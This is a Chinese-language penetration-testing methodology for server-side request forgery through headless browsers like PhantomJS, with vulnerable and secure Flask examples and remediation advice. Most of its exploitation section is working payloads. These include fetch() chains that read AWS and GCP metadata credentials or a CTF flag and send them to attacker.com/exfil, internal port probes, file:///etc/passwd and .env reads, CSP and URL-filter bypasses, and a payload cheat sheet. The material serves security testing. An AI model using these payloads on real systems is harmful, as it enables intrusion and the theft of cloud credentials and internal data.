# SSRF via PhantomJS 攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的 SSRF via PhantomJS 攻击检测与利用流程，帮助识别和利用 headless 浏览器渲染用户控制 HTML 内容导致的服务器端请求伪造漏洞。

## 1.2 适用范围

本文档适用于所有使用 PhantomJS、Puppeteer、Playwright 等 headless 浏览器渲染用户控制 HTML 内容的 Web 应用。

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

SSRF via PhantomJS 是指攻击者通过注入恶意 HTML 内容，诱导 headless 浏览器（如 PhantomJS）加载内部网络资源或执行恶意 JavaScript，从而实现服务器端请求伪造、内网探测、敏感数据窃取等攻击。

**本质问题**：应用使用 headless 浏览器渲染未经验证的用户控制 HTML 内容，违背了"不信任用户输入"的原则。

### 常见应用场景

| 应用场景 | 功能描述 | 风险点 |
|---------|---------|-------|
| XSS 验证 | 验证 XSS Payload 是否执行 | 渲染用户提交的 HTML |
| 截图服务 | 生成网页截图 | 加载用户控制的 URL |
| PDF 生成 | 将 HTML 转为 PDF | 渲染用户控制的 HTML |
| 链接预览 | 生成链接预览卡片 | 抓取并渲染外部 URL |
| 性能测试 | 测试页面加载性能 | 加载用户指定的 URL |
| 自动化测试 | 自动化浏览器测试 | 执行用户控制的脚本 |

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-918 | SSRF（服务器端请求伪造） |
| CWE-79 | XSS（跨站脚本攻击） |
| CWE-611 | XXE（XML 外部实体） |

## 2.2 攻击常见于哪些业务场景

### 2.2.1 CTF 挑战应用

**场景描述**：CTF 挑战使用 PhantomJS 验证 XSS Payload 是否执行。

**案例分析**：

```python
# 典型 CTF 验证逻辑
@app.route('/challenge', methods=['POST'])
def challenge():
    solution = request.form.get('solution')
    
    # 将用户输入写入临时 HTML 文件
    html_content = f"""
    <html>
    <body>
        <h1>XSS Challenge</h1>
        <div class="user-input">{solution}</div>
    </body>
    </html>
    """
    
    # 使用 PhantomJS 渲染并检查是否执行 alert
    result = phantomjs.render(html_content)
    
    if 'alert' in result.console:
        return "XSS 验证成功！Flag: flag{...}"
```

**风险点**：
- 用户输入直接嵌入 HTML
- PhantomJS 执行用户注入的 JavaScript
- 可注入资源加载触发 SSRF

### 2.2.2 链接预览服务

**场景描述**：应用抓取用户提交的 URL 并生成预览。

```python
# 典型链接预览逻辑
@app.route('/preview', methods=['POST'])
def preview():
    url = request.form.get('url')
    
    # 使用 PhantomJS 加载 URL 并截图
    screenshot = phantomjs.screenshot(url)
    
    return send_file(screenshot)
```

**风险点**：
- URL 未验证可指向内网
- PhantomJS 访问内网服务
- 可探测内网端口和服务

### 2.2.3 HTML 转 PDF 服务

**场景描述**：应用将用户提交的 HTML 内容转换为 PDF。

```python
# 典型 HTML 转 PDF 逻辑
@app.route('/to-pdf', methods=['POST'])
def to_pdf():
    html = request.form.get('html')
    
    # 使用 PhantomJS 渲染并生成 PDF
    pdf = phantomjs.render_pdf(html)
    
    return send_file(pdf)
```

**风险点**：
- HTML 内容用户可控
- PhantomJS 加载 HTML 中的资源
- 可注入 img/iframe 触发 SSRF

## 2.3 漏洞探测方法

### 2.3.1 黑盒测试

**步骤 1：识别 PhantomJS 使用**

```bash
# 测试 XSS 验证端点
curl -X POST http://target.com/challenge \
  -d "solution=<img src=x onerror=alert(1)>"

# 观察：
# - 响应时间是否显著增加（2-5 秒）？
# - 是否返回"验证成功"或类似消息？
# - 是否有延迟执行迹象？

# 测试链接预览
curl -X POST http://target.com/preview \
  -d "url=http://attacker.com/test"

# 观察：
# - 是否收到来自服务器的请求？
# - 是否生成截图或预览？
```

**步骤 2：DNSLog 检测**

```bash
# 使用 DNSLog 检测 SSRF
curl -X POST http://target.com/challenge \
  -d "solution=<img src=http://$(whoami).dnslog.cn>"

# 检查 DNSLog 平台是否收到 DNS 请求
# 如果收到，说明 PhantomJS 执行了 img 加载
```

**步骤 3：时间延迟检测**

```bash
# 测试 SSRF 时间延迟
curl -X POST http://target.com/preview \
  -d "url=http://127.0.0.1:80/sleep?seconds=5"

# 观察响应时间是否增加 5 秒
# 如果增加，说明 PhantomJS 访问了内网
```

### 2.3.2 白盒测试

**代码审计要点**：

```python
# ❌ 危险代码示例

# 场景 1：XSS 验证
@app.route('/challenge', methods=['POST'])
def challenge():
    solution = request.form.get('solution')
    html = f"<div>{solution}</div>"  # 直接拼接
    phantomjs.render(html)  # 渲染用户 HTML

# 场景 2：链接预览
@app.route('/preview', methods=['POST'])
def preview():
    url = request.form.get('url')
    phantomjs.screenshot(url)  # 直接加载用户 URL

# 场景 3：HTML 转 PDF
@app.route('/to-pdf', methods=['POST'])
def to_pdf():
    html = request.form.get('html')
    phantomjs.render_pdf(html)  # 渲染用户 HTML

# ✅ 安全代码示例

# 使用内容安全策略
@app.route('/challenge', methods=['POST'])
def challenge():
    solution = escape_html(request.form.get('solution'))
    html = f"""
    <html>
    <head>
        <meta http-equiv="Content-Security-Policy" 
              content="default-src 'none';">
    </head>
    <body>
        <div>{solution}</div>
    </body>
    </html>
    """
    phantomjs.render(html)

# URL 白名单验证
from urllib.parse import urlparse

ALLOWED_DOMAINS = ['example.com', 'www.example.com']

@app.route('/preview', methods=['POST'])
def preview():
    url = request.form.get('url')
    parsed = urlparse(url)
    
    if parsed.hostname not in ALLOWED_DOMAINS:
        abort(403)
    
    phantomjs.screenshot(url)
```

## 2.4 漏洞利用方法

### 2.4.1 基础 SSRF 探测

**内网端口扫描**：

```html
<!-- 注入多个资源探测端口 -->
<img src="http://127.0.0.1:22/">
<img src="http://127.0.0.1:6379/">
<img src="http://127.0.0.1:27017/">
<img src="http://127.0.0.1:3306/">
<img src="http://127.0.0.1:5432/">
<img src="http://127.0.0.1:8080/">
<img src="http://127.0.0.1:5000/">

<!-- 如果 PhantomJS 尝试加载这些资源 -->
<!-- 可通过响应时间差异判断端口开放状态 -->
```

**DNS 外带探测**：

```html
<!-- 使用 DNSLog 外带 -->
<img src="http://EXFIL.attacker.com/">

<!-- 带数据外带 -->
<img src="http://$(whoami).attacker.com/">

<!-- JavaScript 外带 -->
<script>
fetch('http://attacker.com/exfil?data=' + document.domain);
</script>
```

### 2.4.2 云元数据服务访问

**AWS EC2 元数据**：

```html
<!-- 基础元数据访问 -->
<img src="http://169.254.169.254/latest/meta-data/">

<!-- IAM 凭证窃取 -->
<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">

<!-- JavaScript 提取 -->
<script>
fetch('http://169.254.169.254/latest/meta-data/')
  .then(r => r.text())
  .then(data => {
    fetch('http://attacker.com/exfil?data=' + encodeURIComponent(data));
  });
</script>
```

**GCP 元数据**：

```html
<!-- GCP 元数据访问 -->
<img src="http://metadata.google.internal/computeMetadata/v1/" 
     style="all:initial">

<!-- 需要 Metadata-Flavor 头部 -->
<script>
fetch('http://metadata.google.internal/computeMetadata/v1/', {
  headers: {'Metadata-Flavor': 'Google'}
})
.then(r => r.text())
.then(data => {
  fetch('http://attacker.com/exfil?data=' + encodeURIComponent(data));
});
</script>
```

### 2.4.3 内网服务探测

**Redis 未授权访问探测**：

```html
<!-- 探测 Redis 服务 -->
<img src="http://127.0.0.1:6379/">

<!-- 如果 Redis 未授权访问 -->
<!-- PhantomJS 可能收到 Redis 响应 -->
<!-- 可通过响应内容判断 -->
```

**MongoDB 探测**：

```html
<!-- 探测 MongoDB -->
<img src="http://127.0.0.1:27017/">
```

**Elasticsearch 探测**：

```html
<!-- 探测 Elasticsearch -->
<img src="http://127.0.0.1:9200/">
```

### 2.4.4 完整利用链

**场景**：Flask CTF 应用使用 PhantomJS 验证 XSS

**利用步骤**：

```bash
# 步骤 1：确认 PhantomJS 使用
curl -X POST http://localhost:41943/challenge \
  -d "solution=<img src=x onerror=alert(1)>"

# 观察响应时间（2-5 秒表示可能使用 PhantomJS）

# 步骤 2：DNSLog 检测 SSRF
curl -X POST http://localhost:41943/challenge \
  -d "solution=<img src=http://test.dnslog.cn>"

# 检查 DNSLog 平台是否收到请求

# 步骤 3：内网端口扫描
PAYLOAD='<img src="http://127.0.0.1:22/">
<img src="http://127.0.0.1:6379/">
<img src="http://127.0.0.1:8080/">'

curl -X POST http://localhost:41943/challenge \
  -d "solution=$PAYLOAD"

# 步骤 4：结合 XSS 窃取 Flag
# 如果 Flag 在页面中显示
PAYLOAD='<img src=x onerror="fetch(window.location).then(r=>r.text()).then(html=>{
  const d=new DOMParser().parseFromString(html,\"text/html\");
  const flag=d.querySelector(\".flag\").textContent;
  fetch(\"http://attacker.com/exfil?data=\"+encodeURIComponent(flag));
})">'

curl -X POST http://localhost:41943/challenge \
  -d "solution=$PAYLOAD"
```

### 2.4.5 组合攻击

**SSRF + XSS 组合攻击**：

```html
<!-- 步骤 1：注入 SSRF Payload -->
<img src="http://169.254.169.254/latest/meta-data/" 
     onerror="this.style.display='none'">

<!-- 步骤 2：同时注入 XSS -->
<script>
// 在 PhantomJS 中执行
fetch('http://169.254.169.254/latest/meta-data/')
  .then(r => r.text())
  .then(data => {
    // 提取敏感数据
    const flag = data.match(/flag\{.*?\}/)[0];
    // 外带数据
    fetch('http://attacker.com/exfil?data=' + flag);
  });
</script>
```

**SSRF + 路径遍历组合攻击**：

```html
<!-- 如果应用同时存在路径遍历 -->
<link rel="stylesheet" href="file:///etc/passwd">

<!-- 或 -->
<img src="file:///var/www/html/.env">
```

### 2.4.6 无认证系统 SSRF 利用

**场景**：应用无认证机制，所有端点公开访问

**利用方法**：

```bash
# 步骤 1：确认无认证
curl -v http://target.com/preview
# 响应：200 OK（无 401/403/重定向）

# 步骤 2：直接提交 SSRF Payload
curl -X POST http://target.com/preview \
  -d "url=http://169.254.169.254/latest/meta-data/"

# 步骤 3：如果应用有速率限制绕过
# 使用代理池或延迟请求
```

## 2.5 漏洞利用绕过方法

### 2.5.1 CSP 绕过

**场景**：应用设置 Content-Security-Policy

**绕过方法**：

```html
<!-- 如果 CSP 允许'self' -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'">

<!-- 使用 data: URI -->
<img src="data:image/svg+xml,<svg onload=alert(1)>">

<!-- 使用 blob: URI -->
<script>
const blob = new Blob(['<script>alert(1)</script>'], {type: 'text/html'});
const url = URL.createObjectURL(blob);
window.location = url;
</script>
```

### 2.5.2 URL 验证绕过

**场景**：应用验证 URL 但存在绕过

**绕过方法**：

```bash
# 方法 1：DNS 重绑定
# 首次解析为允许域名，二次解析为内网 IP
http://bind.attacker.com

# 方法 2：@符号绕过
http://allowed.com@127.0.0.1/
# URL 解析为用户@主机格式

# 方法 3：重定向绕过
# 攻击者服务器重定向到内网
http://attacker.com/redirect -> http://127.0.0.1:6379/

# 方法 4：IPv6 表示
http://[::1]/  # 127.0.0.1 的 IPv6
http://[0:0:0:0:0:ffff:7f00:1]/
```

### 2.5.3 协议限制绕过

**场景**：应用只允许 http://和 https://

**绕过方法**：

```html
<!-- 使用 JavaScript 协议 -->
<a href="javascript:alert(1)">click</a>

<!-- 使用 data: 协议 -->
<iframe src="data:text/html,<script>alert(1)</script>"></iframe>

<!-- 使用 blob: 协议 -->
<script>
const blob = new Blob(['<script>alert(1)</script>'], {type: 'text/html'});
const url = URL.createObjectURL(blob);
window.location = url;
</script>
```

### 2.5.4 时间窗口绕过

**场景**：PhantomJS 有执行时间限制（如 2-5 秒）

**绕过方法**：

```html
<!-- 使用快速响应目标 -->
<!-- 本地服务响应时间：1-10ms -->
<img src="http://127.0.0.1:80/">

<!-- 云元数据响应时间：20-100ms -->
<img src="http://169.254.169.254/latest/meta-data/">

<!-- DNS 查询：即时 -->
<img src="http://attacker.com/">

<!-- 异步请求（不等待响应） -->
<script>
// 发送请求但不等待响应
fetch('http://127.0.0.1:6379/', {mode: 'no-cors'});
// PhantomJS 可能立即继续执行
</script>
```

---

# 第三部分：附录

## 3.1 常用 Payload 速查表

| 类别 | Payload | 说明 |
|-----|---------|------|
| 基础 SSRF | `<img src="http://127.0.0.1:6379/">` | 内网探测 |
| AWS 元数据 | `<img src="http://169.254.169.254/latest/meta-data/">` | 窃取凭证 |
| DNS 外带 | `<img src="http://attacker.com/">` | 数据外带 |
| XSS+SSRF | `<img src=x onerror="fetch('http://attacker.com/')">` | 组合攻击 |
| 文件协议 | `<img src="file:///etc/passwd">` | 读取文件 |
| JavaScript 协议 | `<a href="javascript:alert(1)">` | 执行 JS |
| Data URI | `<iframe src="data:text/html,<script>alert(1)</script>">` | 绕过 CSP |

## 3.2 自动化工具

| 工具 | 用途 | 链接 |
|-----|------|------|
| SSRFmap | SSRF 利用框架 | https://github.com/swisskyrepo/SSRFmap |
| Gopherus | Gopher payload 生成 | https://github.com/tarunkant/Gopherus |
| Burp Suite | SSRF 检测 | https://portswigger.net/burp |
| Collaborator | 带外检测 | https://portswigger.net/burp/collaborator |

## 3.3 修复建议

**输入验证**：
1. 使用 URL 白名单
2. 禁止内网 IP 段
3. 禁止特殊协议（file://, gopher://, dict://）

**PhantomJS 配置**：
1. 设置 Content-Security-Policy
2. 禁用外部资源加载
3. 限制执行时间

**网络隔离**：
1. 容器网络隔离
2. 防火墙规则阻止访问内网
3. 使用代理服务器控制出站请求

---

**参考资源**：
- [OWASP Cheat Sheet: SSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger - SSRF](https://portswigger.net/web-security/ssrf)
- [PhantomJS Security](https://phantomjs.org/security.html)
